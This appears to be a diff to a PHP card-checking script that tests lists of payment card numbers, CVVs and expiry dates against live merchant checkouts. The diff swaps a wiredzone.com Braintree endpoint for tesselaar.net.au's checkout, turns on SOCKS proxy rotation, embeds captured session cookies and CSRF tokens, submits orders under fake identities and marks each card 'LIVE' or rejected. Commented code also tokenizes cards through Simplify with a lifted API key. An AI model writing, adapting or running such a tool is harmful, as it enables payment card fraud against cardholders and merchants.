@@ -46,10 +46,15 @@ if($cbin == "3"){
    $cardnum = "$cc1 $cc2 $cc3 $cc4";
 }
 
+
+
 If(strlen($ano) > 2)
 {
   $ano = substr($ano,2,2);
 }
+
+
+
  function value($str,$find_start,$find_end){
 $start = @strpos($str,$find_start);
 if ($start === false) {
@@ -135,23 +140,65 @@ $poxySocks5 = ibuuproxy();
 $fname = 'Justin'.rand(abcdefghijklmnopqrstuvwxyz,999).'';
 $lname = 'Wang';
 // $email = $fname.'.'.$lname.''.rand(10,99999).'@yopmail.com';
-// $email2 = $fname.rand(10,999).'@yopmail.com';
+$email2 = $fname.rand(10,999).'@yopmail.com';
 // //$password = 'P@5%Word';
-// $password2 = 'Hansabhen1@';
+$password2 = 'Hansabhen1@';
 $counters = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
 $counters2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
 
-$dbtime = substr(str_shuffle(str_repeat("0123456789", 9)), 0, 10);
+$dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);
 
 
 
 
 //============================================================================================================================================================
+// function updatecart(){
 
 
+// $ch = curl_init();
+// curl_setopt($ch, CURLOPT_URL, 'https://api.simplify.com/v1/api/payment/cardToken');
+// curl_setopt($ch, CURLOPT_HEADER, 0);
+// curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+//    // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
+//    // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+// // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
+// // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
+// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+// curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
+// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+// 'Accept: */*',
+// 'Accept-Encoding: gzip, deflate, br',
+// 'Accept-Language: en-US,en;q=0.9',
+// 'Content-Type: application/json;charset=UTF-8',
+// 'Host: api.simplify.com',
+// 'Origin: https://api.simplify.com',
+// 'Referer: https://api.simplify.com/v1/api/payment/cardToken/proxy.html?xdm_e=https%3A%2F%2Fwww.circlel.com.au&xdm_c=default8770&xdm_p=1',
+// 'user-agent: '.$browser.''
+// ));
+
+// curl_setopt($ch, CURLOPT_POSTFIELDS, '{"key":"lvpb_ZWNhMzhjYTUtMjg5ZC00OWM1LTk3ZTItODU5NzQyN2QxYjEx","card":{"number":"'.$cc.'","cvc":"'.$cvv.'","expMonth":'.$mes1.',"expYear":'.$ano.',"addressLine1":"12 avenue","addressLine2":"","addressCountry":"AU","addressState":"NSW","addressZip":"2150","addressCity":"Miami"},"source":"SIMPLIFYJS","session_id":"63bd4fd8a973795373c8f1be3177b450"}');
+
+
+// $b_pago = curl_exec($ch);
+
+//  // echo $b_pago;
+//  $token = trim(strip_tags(getstr($b_pago,'false,"id":"','"}')));
+// $issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
+// $issuecountry = trim(strip_tags(getstr($b_pago,'"countryOfIssuance":"','"')));
+// $debit = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
+// $prepaid = trim(strip_tags(getstr($b_pago,'"prepaid":"','"')));
+// $cardtype = trim(strip_tags(getstr($b_pago,'"cardType":"','"')));
+// // echo $token;
+
+// //////////////////////// START REQUEST 2 ////////////////////////
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.wiredzone.com/payment/braintree/s2s/create_json_3ds');
+curl_setopt($ch, CURLOPT_URL, 'https://www.tesselaar.net.au/checkout');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -165,8 +212,8 @@ curl_setopt($ch, CURLOPT_URL, 'https://www.wiredzone.com/payment/braintree/s2s/c
 // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "vxrpebmq-rotate:a0fdakb6ts8a");
 
 //////////////////////// MANUAL Proxy List
-// curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
-// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING TO LIST
+curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
+curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING TO LIST
 
 //////////////////////// LUMINATI
 // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
@@ -177,84 +224,60 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
- curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: application/json, text/javascript, */*; q=0.01',
-'accept-encoding: gzip, deflate, br',
-'accept-language: en-US,en;q=0.9',
-'content-type: application/json',
-'cookie: session_id=c20998faad887da34e3ea6abce9f00f9d9d59d9b; frontend_lang=en_US; im_livechat_history=["/legal/privacy-policy","/shop/category/accessories-kvm-138","/shop/category/accessories-kvm-138?order=list_price+asc&category=138","/shop/cart","/shop/address","/shop/payment","/","/shop?search=pin","/shop?order=list_price+asc&search=pin"]',
-'origin: https://www.wiredzone.com',
-'referer: https://www.wiredzone.com/shop/payment',
+'Accept: */*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript',
+'Accept-Encoding: gzip, deflate, br',
+'Accept-Language: en-US,en;q=0.9',
+'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
+'Cookie: XSRF-TOKEN=vUqjpQkz4Qjg2HmXcg6nJ6Sd4mt9%2BjUkw1hKRRD4Mx8%3D; _tesselaar_session_key=BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiJWEyMTgxMjUzM2JiMTlmMzkwYzhmYzNlYmFlMjhiY2QwBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMXZVcWpwUWt6NFFqZzJIbVhjZzZuSjZTZDRtdDkralVrdzFoS1JSRDRNeDg9BjsARg%3D%3D--492b5b4b1d8481627e2bed9b6ff93fd21f774f10; state_filter=NSW; shopping_cart_checkout_id=%22NTA1MTQ0%250A%22; shopping_cart_id=%22NTA1MjUw%250A%22',
+'Host: www.tesselaar.net.au',
+'Origin: https://www.tesselaar.net.au',
+'Referer: https://www.tesselaar.net.au/checkout',
+'X-CSRF-Token: vUqjpQkz4Qjg2HmXcg6nJ6Sd4mt9+jUkw1hKRRD4Mx8=',
 'user-agent: '.$browser.'',
 ));
 
-//////////////////////// START POST FILED 1 ////////////////////////
+// //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"jsonrpc":"2.0","method":"call","params":{"data_set":"","acquirer_id":"11","return_url":"/shop/payment/validate","partner_id":"182706","csrf_token":"f4d013a1b56f6426de83c80271adbf1e6d5555e4o1592415295","cc_number":"'.$cc1.' '.$cc2.' '.$cc3.' '.$cc4.'","cc_brand":"visa","cc_holder_name":"Vincent Warner","cc_expiry":"'.$mes.' / '.$ano.'","cc_cvc":"'.$cvv.'","cc_street_address":"12 avenue","cc_postal_code":"33101","cc_country":"United States","cc_state":"Florida"},"id":'.$dbtime.'}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'authenticity_token=vUqjpQkz4Qjg2HmXcg6nJ6Sd4mt9%2BjUkw1hKRRD4Mx8%3D&customer%5Bemail%5D=pubgkittu%40gmail.com&customer%5Bfirst_name%5D=Vincent&customer%5Blast_name%5D=Warner&customer%5Bmobile%5D=%2B615182641524&address%5Bcontact%5D=&address%5Bline1%5D=12+avenue&address%5Bline2%5D=&address%5Bsuburb%5D=Miami&address%5Bstate%5D=NSW&address%5Bpostcode%5D=2150&order%5Bdelivery_instruction%5D=&order%5Bcomments%5D=&reference=&amount=&payment%5Bcard_number%5D='.$cc.'&payment%5Bexpiry%5D='.$mes.'%2F'.$ano.'&payment%5Bcvv%5D='.$cvv.'&place_order=Place+order');
 
 
-// // // //*****************************************************************************************************************************************************************************************************************************************************************************
+
+// //*****************************************************************************************************************************************************************************************************************************************************************************
+
+
 $result = curl_exec($ch);
 if (curl_errno($ch)) {
     echo 'Error:'.curl_error($ch);
 }
 curl_close($ch);
-
-
-
-
- // $token = trim(strip_tags(getstr($result,'<input name="__RequestVerificationToken" type="hidden" value="','" /></form>')));
-
-// echo $token;
-$message = trim(strip_tags(getstr($result,'"arguments": ["','", ""]')));
-// // $code = trim(strip_tags(getstr($result,'"message":"','"')));
+$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t<pre><strong><\/strong>\n','<\/pre>\t\t<\/li>\n\t<\/ul>\n"')));
+// // $result = json_decode($result, true);
+$code = trim(strip_tags(getstr($result,'"code":',',"messa')));
 // // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
 
 
-// //////////////////////// BIN INFO ////////////////////////////////
-// // $curl = curl_init();
-// // curl_setopt($curl, CURLOPT_URL, 'https://lookup.binlist.net/'.$binn.'');
-// // curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-// // curl_setopt($curl, CURLOPT_HTTPHEADER, array(
-// // 'Host: lookup.binlist.net',
-// // 'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
-// // 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
-// // ));
-// // curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
-// // curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
-// // curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
-// // curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
-// // curl_setopt($curl, CURLOPT_POSTFIELDS, '');
-// // $fim = curl_exec($curl);
 
-// // $bank = getStr($fim, '"bank":{"name":"','"');
-// // $pais = getStr($fim, '"name":"','"');
-// // $brand = getStr($fim, '"brand":"','"');
-// // $type = trim(strip_tags(getstr($fim,'"type":"','"')));
+if(strpos($result,'Your order has been placed')){
+      // updatecart();
+    echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | Debit : '.$debit.' | Prepaid : '.$prepaid.'</font></b></font></td></tr>';
 
-if(strpos($result,'"result": true')){
-// updatecart();
-      echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
-    }
 
-elseif(strpos($result,'Bad Request')) {
-
-            echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [E R R O R]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
-              }
-elseif(strpos($result,'Gateway Rejected: avs')) {
-
-    echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
-  }
-
+   }
+   elseif(strpos($result,'Sorry!')){
+     echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ E R R O R]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | Debit : '.$debit.' | Prepaid : '.$prepaid.'</font></b></font></td></tr>';
+}
 else {
 
-              echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
+  echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | Debit : '.$debit.' | Prepaid : '.$prepaid.'</font></b></font></td></tr>';
 
 
+  // updatecart();
   }
 curl_close($curl);
 ob_flush();
-      // echo $result;
+// echo $result
+    //echo $result;
 //echo $browser;
 ?>
